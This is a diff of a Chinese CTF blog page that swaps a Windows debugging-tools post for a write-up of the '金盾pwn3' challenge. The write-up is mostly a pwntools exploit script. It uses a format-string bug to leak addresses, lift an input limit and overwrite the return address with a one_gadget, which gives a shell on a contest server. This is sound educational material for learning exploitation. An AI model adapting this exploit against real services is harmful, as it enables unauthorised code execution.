@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="windows漏洞复现环境搭建, Tower">
+    <meta name="keywords" content="金盾pwn3, Tower">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>windows漏洞复现环境搭建 | Tower</title>
+    <title>金盾pwn3 | Tower</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -308,12 +308,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">windows漏洞复现环境搭建</h1>
+                    <h1 class="description center-align post-title">金盾pwn3</h1>
                 </div>
             </div>
         </div>
@@ -430,12 +430,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/windows/">
-                                <span class="chip bg-color">windows</span>
-                            </a>
-                        
-                            <a href="/tags/%E6%BC%8F%E6%B4%9E/">
-                                <span class="chip bg-color">漏洞</span>
+                            <a href="/tags/ctf/">
+                                <span class="chip bg-color">ctf</span>
                             </a>
                         
                     </div>
@@ -446,8 +442,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E6%95%B4%E7%90%86/" class="post-category">
-                                整理
+                            <a href="/categories/%E6%AF%94%E8%B5%9B/" class="post-category">
+                                比赛
                             </a>
                         
                     </div>
@@ -459,21 +455,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-12-07
+                    2020-12-20
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-12-08
+                    2020-12-23
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    129
+                    351
                 </div>
                 
 
@@ -495,14 +491,92 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="进程查看工具"><a href="#进程查看工具" class="headerlink" title="进程查看工具"></a>进程查看工具</h2><p>process hacker 可以在看雪上下载</p>
-<p><a target="_blank" rel="noopener" href="https://tool.pediy.com/index-detail-106.htm">https://tool.pediy.com/index-detail-106.htm</a></p>
-<h2 id="动态调试工具"><a href="#动态调试工具" class="headerlink" title="动态调试工具"></a>动态调试工具</h2><p>ollydbg 吾爱破解的一个比较强大的工具（9年前的版本现在依然好用）</p>
-<p>试了一下windbg调试，命令一大堆，用起来极其不友好，果断放弃</p>
-<p><a target="_blank" rel="noopener" href="https://down.52pojie.cn/?query=ollydbg">https://down.52pojie.cn/?query=ollydbg</a></p>
-<p>如果对windbg感兴趣参考，配置起来也不是十分麻烦。建议用ollydbg</p>
-<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/205867">https://www.anquanke.com/post/id/205867</a></p>
-<p><strong>具体使用参见cve-2017-11882分析</strong></p>
+                <p>对输入数据进行了拼接然后输出，输出的时候有格式化字符串漏洞。<br>循环限制输入三次。</p>
+<p>第一次泄露elf文件基地址，第二次修改三次限制。<br>之后泄露libc基地址，栈地址，修改返回地址输入exit返回。</p>
+<p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1608471746924.png" alt="格式化字符串"></p>
+<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+file_path <span class="token operator">=</span> <span class="token string">"./Ktalk"</span>
+context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span>
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>
+<span class="token comment" spellcheck="true"># context.terminal = ['tmux', 'splitw', '-h']</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>
+
+debug <span class="token operator">=</span> <span class="token number">0</span>
+<span class="token keyword">if</span> debug<span class="token punctuation">:</span>
+    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span>file_path<span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token comment" spellcheck="true"># gdb.attach(p, "b *$rebase(0x121c)")</span>
+    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>
+    one<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x45226</span><span class="token punctuation">,</span><span class="token number">0x4527a</span><span class="token punctuation">,</span><span class="token number">0xf0364</span><span class="token punctuation">,</span><span class="token number">0xf1207</span><span class="token punctuation">]</span>
+
+<span class="token keyword">else</span><span class="token punctuation">:</span>
+    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'59.110.167.125'</span><span class="token punctuation">,</span>  <span class="token number">24002</span><span class="token punctuation">)</span>
+    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>
+    one<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x45226</span><span class="token punctuation">,</span><span class="token number">0x4527a</span><span class="token punctuation">,</span><span class="token number">0xf0364</span><span class="token punctuation">,</span><span class="token number">0xf1207</span><span class="token punctuation">]</span>
+
+<span class="token keyword">def</span> <span class="token function">debug_1</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>PIE<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    debug_str <span class="token operator">=</span> <span class="token string">""</span>
+    <span class="token keyword">if</span> PIE<span class="token punctuation">:</span>
+        text_base <span class="token operator">=</span> int<span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"pmap {}| awk '{{print $1}}'"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>p<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
+        <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>
+            debug_str<span class="token operator">+=</span><span class="token string">'b *{}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>
+            text_base<span class="token operator">=</span><span class="token number">0</span>
+            debug_str<span class="token operator">+=</span><span class="token string">'b *{}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">lun</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"say what???\n"</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">get_shell</span><span class="token punctuation">(</span>content<span class="token punctuation">,</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>
+
+    i<span class="token operator">=</span><span class="token number">0</span>
+    <span class="token keyword">for</span> item <span class="token keyword">in</span> content<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>target<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+        pay<span class="token operator">=</span><span class="token string">"%{}c%{}$hhn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>item<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>target<span class="token operator">+</span>i<span class="token punctuation">)</span>
+        i<span class="token operator">+=</span><span class="token number">1</span>
+
+        lun<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>
+
+
+
+lun<span class="token punctuation">(</span><span class="token string">"%{}$p"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">0x2b</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+offset<span class="token operator">=</span><span class="token number">0x20840</span>
+
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"I hear you say: "</span><span class="token punctuation">)</span>
+addr<span class="token operator">=</span>int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
+libc<span class="token punctuation">.</span>base<span class="token operator">=</span>addr<span class="token operator">-</span>offset
+<span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>base<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+
+lun<span class="token punctuation">(</span><span class="token string">"%{}$p"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">0x27</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"I hear you say: "</span><span class="token punctuation">)</span>
+addr<span class="token operator">=</span>int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
+offset<span class="token operator">=</span><span class="token number">0xbaf</span>
+elfbase<span class="token operator">=</span>addr<span class="token operator">-</span>offset
+<span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>elfbase<span class="token punctuation">)</span><span class="token punctuation">)</span>
+get_shell<span class="token punctuation">(</span><span class="token string">"\x20"</span><span class="token punctuation">,</span>elfbase<span class="token operator">+</span><span class="token number">0x202010</span><span class="token punctuation">)</span>
+
+
+lun<span class="token punctuation">(</span><span class="token string">"%{}$p"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">0x26</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"I hear you say: "</span><span class="token punctuation">)</span>
+addr<span class="token operator">=</span>int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
+offset<span class="token operator">=</span><span class="token number">0x8</span>
+ss<span class="token operator">=</span>addr<span class="token operator">-</span>offset
+<span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>ss<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+
+<span class="token comment" spellcheck="true"># get_shell(p64(0x20),+0x202010)</span>
+<span class="token comment" spellcheck="true">#</span>
+<span class="token comment" spellcheck="true"># debug_1([0x000000000000B69])</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>base<span class="token operator">+</span>one<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+get_shell<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>base<span class="token operator">+</span>one<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span>ss<span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
 
             </div>
             <hr/>
@@ -516,12 +590,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/windows/">
-                                    <span class="chip bg-color">windows</span>
-                                </a>
-                            
-                                <a href="/tags/%E6%BC%8F%E6%B4%9E/">
-                                    <span class="chip bg-color">漏洞</span>
+                                <a href="/tags/ctf/">
+                                    <span class="chip bg-color">ctf</span>
                                 </a>
                             
                         </div>
@@ -566,7 +636,7 @@
         repo: '',
         owner: '',
         admin: null,
-        id: '2020-12-07T23-06-06',
+        id: '2020-12-20T21-36-29',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -590,50 +660,52 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2020/12/07/%20CVE-2017-11882%E5%88%86%E6%9E%90/">
+                <a href="/2020/12/20/%E9%87%91%E7%9B%BEpwn3/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="CVE-2017-11882分析">
+                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="金盾pwn3">
                         
-                        <span class="card-title">CVE-2017-11882分析</span>
+                        <span class="card-title">金盾pwn3</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            参考文档https://github.com/houjingyi233/office-exploit-case-study/tree/master/CVE-2017-11882%26CVE-2018-0802%26CVE-2018-0798
+                            对输入数据进行了拼接然后输出，输出的时候有格式化字符串漏洞。循环限制输入三次。
+第一次泄露elf文件基地址，第二次修改三次限制。之后泄露libc基地址，栈地址，修改返回地址输入exit返回。
+
+#coding=utf-8
+from pwn 
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-12-07
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-12-20
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%95%B4%E7%90%86/" class="post-category">
-                                    整理
+                            <a href="/categories/%E6%AF%94%E8%B5%9B/" class="post-category">
+                                    比赛
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/windows/">
-                        <span class="chip bg-color">windows</span>
-                    </a>
-                    
-                    <a href="/tags/%E6%BC%8F%E6%B4%9E/">
-                        <span class="chip bg-color">漏洞</span>
+                    <a href="/tags/ctf/">
+                        <span class="chip bg-color">ctf</span>
                     </a>
                     
                 </div>
@@ -647,26 +719,30 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/12/06/iot%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">
+                <a href="/2020/12/10/%E6%BC%8F%E6%B4%9E%E6%9F%A5%E6%89%BE%E4%B9%8B%E6%AF%94%E8%BE%83%E8%A1%A5%E4%B8%81/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="iot工具使用">
+                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="漏洞查找之比较补丁">
                         
-                        <span class="card-title">iot工具使用</span>
+                        <span class="card-title">漏洞查找之比较补丁</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            说明注：以项目为主线，完成任务并且有时间可以深入分析，之后会补充详细的工具使用
-这里对常用工具进行说明。
-下载或提取到的固件是包含整个操作系统和文件系统的。包括boot-loader（一般是uboot，用来引导系统启动），linux内核，文
+                            搜索camara找到一个类似二进制漏洞文件（缓冲区溢出）
+
+双击进来之后有一些简单的描述
+
+下载到了有和没有漏洞的固件，用bindiff比较了一下，发现区别最大的函数
+
+ghidra打开跳转到对应地址（L快捷键可以重命名变量，;（英文的分号
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-12-06
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-12-10
                             </span>
                         <span class="publish-author">
                             
